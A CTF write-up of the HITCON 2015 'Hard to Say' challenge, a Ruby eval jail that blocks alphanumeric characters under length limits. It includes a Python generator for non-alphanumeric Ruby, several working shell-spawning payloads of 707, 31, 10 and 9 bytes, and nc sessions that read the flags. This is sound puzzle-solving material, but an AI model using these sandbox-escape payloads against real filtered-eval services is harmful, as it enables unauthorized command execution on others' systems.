---
title: "HITCON 2015 Qualifiers - Hard to Say (Misc)"
header:
  overlay_image: /assets/images/hitconquals2015/hardtosay/ruby.png
  overlay_filter: 0.5
tags:
  - hitconquals2015
  - writeup
  - misc
---

Execute arbitrary non-alphanumeric ruby code with length limitations.

## Challenge Description

#### Description

```
Ruby on Fails.
FLAG1: nc 54.199.215.185 9001
FLAG2: nc 54.199.215.185 9002
FLAG3: nc 54.199.215.185 9003
FLAG4: nc 54.199.215.185 9004

hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb
```

## Solution

We are given a simple ruby file:

```ruby
#!/usr/bin/env ruby

fail 'flag?' unless File.file?('flag')

$stdout.sync = true

limit = ARGV[0].to_i
puts "Hi, I can say #{limit} bytes :P"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... I cannot say this, maybe it is too long or too weird :('
  exit
end

puts "I think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

The script takes an argument: the accepted input length limit. First, the binary
checks if the input is smaller than the limit, then it checks if it contains
alphanumeric characters. If it does, it exits. Otherwise, it evaluates the
input.

```shell
$ ruby hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb  100
Hi, I can say 100 bytes :P
$.
I think size = 2 is ok to me.
1
```

We have four flags to get for this challenge. Let's try to get the first one:

```shell
$ nc 54.199.215.185 9001
Hi, I can say 1024 bytes :P
""
I think size = 2 is ok to me.
```

It gives us 1024 bytes to work with. Looking online, we find that there's a [web
page](http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/)
that discusses non-alphanumeric ruby.

The basic gist of the strategy is to use these four primitives:

1. The special variable `$.` (line number) gives us the number 1
2. Shovelling numbers into an empty quote gives strings. `"" << 65 << 66` gives
   `"AB"`, for example.
3. `#{<to be evaluated>}` lets us evaluate something as text
4. Backticks let us run what's within it as a shell command

So, we wrote a script to generate our non-alphanumeric ruby code.

```python
def convert(s):
    # Convert the string to list of nums we need
    needed = [ord(i) for i in s]
    needed_set = list(set(needed))

    # Get our identity
    ident = "$_ = $$/$$;"
    attack_string = ident

    # Generate our set of needed numbers
    sigils = {}
    for i in range(len(needed_set)):
        curr_sigil = "@" + "_"*(i+1)
        curr_decl = "%s = %s;" % (curr_sigil, "+".join(["$_"]*needed_set[i]))
        attack_string += curr_decl
        sigils[needed_set[i]] = curr_sigil

    # Generate the string shovel
    shovel_sigils = [sigils[i] for i in needed]
    shovel = "$__ = '' << %s;`#{$__}`" % "<<".join(shovel_sigils)
    attack_string += shovel

    return attack_string

def main():
    attack = 'sh'
    exploit = convert(attack)
    print len(exploit)
    print exploit

if __name__ == "__main__":
    main()
```

Running the script:

```shell
$ python encode1.py
707
$_ = $$/$$;@_ = $_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_;@__ = $_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_;$__ = '' << @__<<@_;`#{$__}`
```

Attacking the server:

```shell
$ nc 54.199.215.185 9001
Hi, I can say 1024 bytes :P
$_ = $$/$$;@_ = $_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_;@__ = $_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_;$__ = '' << @__<<@_;`#{$__}`
I think size = 707 is ok to me.
ls -la 1>&2
total 12
drwxr-xr-x 2 nobody nogroup    4096 Oct 16 12:59 .
drwxr-xr-x 8 nobody nogroup    4096 Oct 16 12:07 ..
----r----- 1 nobody 4000000001   58 Oct 16 12:59 flag
cat flag 1>&2
hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}
```

Now, let's try the second server.

```shell
$ nc 54.199.215.185 9002
Hi, I can say 64 bytes :P
[]
I think size = 2 is ok to me.
[]
```

Well, our script will not work for this one, so let's handcraft a solution. First, we need to investigate a little.

```shell
$ nc 54.199.215.185 9002
Hi, I can say 64 bytes :P
$:
I think size = 2 is ok to me.
["/home/shik/.rbenv/versions/2.2.3/lib/ruby/site_ruby/2.2.0", "/...
```

We could use the strings in this array. So let's split it into two parts:

1. Get a reference to a string. `(_=$:[$.])`
2. Take the "s" and the "h", then run as a shell command. (`` `#{_[$$+$.+$.]+_[$.]}` ``)

So, let's get the flag:

```shell
$ nc 54.199.215.185 9002
Hi, I can say 64 bytes :P
_=$:[$.];`#{_[$$+$.+$.]+_[$.]}`
I think size = 31 is ok to me.
cat flag 1>&2
hitcon{Ruby in Peace m(_ _)m}
```

We can reuse our solution for the third flag because it requires 36 bytes:

```shell
$ nc 54.199.215.185 9003
Hi, I can say 36 bytes :P
_=$:[$.];`#{_[$$+$.+$.]+_[$.]}`
I think size = 31 is ok to me.
cat flag 1>&2
hitcon{My cats also know how to code in ruby :cat:}
```

Now, we didn't manage to solve for the fourth server (which had a limit of 10) but we learnt of two very cool solutions over IRC:

```shell
11:32 < amona> anyone has a sample of a less than 10 char solution for hard to say 4
11:32 < binary_raider> `$#{~-$.}`
11:32 < amona> ahhh
11:32 < amona> unary complement
11:34 < hellman> amona: also ~// works (9 char solution)
```
Thanks to binary\_raider and hellman for these solutions!

```shell
$ nc 54.199.215.185 9004
Hi, I can say 10 bytes :P
`$#{~-$.}`
I think size = 10 is ok to me.
cat flag 1>&2
hitcon{It's hard to say where ruby went wrong QwO}
```

```shell
$ nc 54.199.215.185 9004
Hi, I can say 10 bytes :P
`$#{~//}`
I think size = 9 is ok to me.
cat flag 1>&2
hitcon{It's hard to say where ruby went wrong QwO}
````

Mind blowingly elegant solutions :)

Flag 1: **hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}**

Flag 2: **hitcon{Ruby in Peace m(\_ \_)m}**

Flag 3: **hitcon{My cats also know how to code in ruby :cat:}**

Flag 4: **hitcon{It's hard to say where ruby went wrong QwO}**

